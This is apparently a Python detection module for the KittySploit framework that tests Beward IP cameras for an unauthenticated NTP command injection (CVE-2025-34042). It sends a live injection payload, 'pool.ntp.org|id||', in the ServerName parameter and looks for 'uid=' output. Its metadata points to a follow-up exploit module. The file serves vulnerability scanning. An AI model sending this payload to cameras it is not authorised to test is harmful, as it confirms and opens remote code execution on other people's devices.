#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Beward IP camera servetest NTP command injection (CVE-2025-34042 / Feb 2019)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Beward IP Camera - servetest NTP RCE Detection (CVE-2025-34042)',
        'description': (
            'Detects Beward camera command injection via '
            '/cgi-bin/operator/servetest?cmd=ntp&ServerName=pool.ntp.org|id||'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2025', 'beward', 'camera', 'iot', 'rce',
            'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'exploits/linux/http/beward_cve_2025_34042_rce',
                ],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2025-34042'],
        'cve': 'CVE-2025-34042',
    }

    def run(self):
        path = (
            '/cgi-bin/operator/servetest?cmd=ntp&ServerName=pool.ntp.org|id||&TimeZone=03:00'
        )
        r = self.http_request(
            method='GET',
            path=path,
            headers={'Accept-Encoding': 'gzip, deflate'},
            allow_redirects=False,
        )
        if r and re.search(r'uid=\d+', r.text or ''):
            self.set_info(
                severity='critical',
                reason='Beward servetest NTP command injection (CVE-2025-34042)',
                path='/cgi-bin/operator/servetest',
            )
            return True
        return False
